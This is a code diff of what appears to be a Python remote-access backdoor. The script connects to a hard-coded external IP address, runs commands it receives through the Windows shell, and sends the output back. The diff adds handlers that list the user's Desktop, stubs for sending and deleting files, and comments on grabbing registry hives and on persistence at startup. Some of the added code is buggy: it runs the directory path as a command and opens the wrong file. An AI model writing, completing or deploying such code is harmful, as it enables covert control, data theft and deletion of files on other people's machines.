@@ -16,9 +16,9 @@ s.connect(("131.155.246.144", 1234))
 # Additionally, we also want to look at making the tool automatically boot up on start up.
 # This can be done by adding the exe on the start-up directory but not essential
 
-#For the cmd part
+# For the cmd part
 # https://www.stackvidhya.com/execute-system-command-or-shell-command-python/
-#https://datatofish.com/command-prompt-python/
+# https://datatofish.com/command-prompt-python/
 
 while (True):
     msg = s.recv(1024)
@@ -36,12 +36,10 @@ while (True):
 
     elif decodedMsg == "test":
         result = subprocess.run(['dir', 'Desktop'], capture_output=True, shell=True)
-        print(result.stdout.decode())
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
     elif decodedMsg == "test1":
         command = "dir Desktop & echo 'All the files and folders are listed'"
         result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
-        print(result.stdout.decode())
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
     # code to retrieve the registry files (hives)
     elif decodedMsg == "retrieveh":
@@ -71,9 +69,46 @@ while (True):
     # just a response so we don't break the message response pattern  
     elif decodedMsg == "getaccess":
         s.sendall(bytes("nice", "utf-8"))
-    # https://docs.python.org/3/library/subprocess.html#subprocess.Popen.communicate
-    # here we can see that we can get output from certain executions so maybe we can use this to execute commands one by one
-    # could include like command and then choose which command to use
+    # https://docs.python.org/3/library/subprocess.html#subprocess.Popen.communicate here we can see that we can get
+    # output from certain executions, so maybe we can use this to execute commands one by one could include like
+    # command and then choose which command to use
+    #https://www.computerhope.com/issues/chusedos.htm
+    elif decodedMsg == "SendFiles-Desktop":
+        dir =  "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
+        command = dir + "&& dir"
+        result = subprocess.run(command , stdout=subprocess.PIPE, shell=True)
+        s.sendall(bytes(result.stdout.decode(), "utf-8"))
+        msg = s.recv(1024)
+        decodedMsg = msg.decode("utf-8")
+        if decodedMsg == "cancel":
+            s.sendall(bytes("cancelled", "utf-8"))
+
+        else:
+            file = command+ decodedMsg
+            f = open("file", "rb")
+
+            #https: // stackoverflow.com / questions / 27241804 / sending - a - file - over - tcp - sockets - in -python
+            #rb needed for sending binary file
+
+    elif decodedMsg == "DeleteFiles-Desktop":
+        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
+        command = dir + "&& dir"
+        result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
+        s.sendall(bytes(result.stdout.decode(), "utf-8"))
+        msg = s.recv(1024)
+        decodedMsg = msg.decode("utf-8")
+        if decodedMsg == "cancel":
+            s.sendall(bytes("cancelled", "utf-8"))
+
+        else:
+            file = command + decodedMsg
+            #might not need shell and stdout
+            subprocess.run(command, stdout=subprocess.PIPE, shell=True)
+            s.sendall(bytes("File Deleted", "utf-8"))
+
+
+
+
     else:
         s.sendall(bytes("Invalid Command", "utf-8"))
 
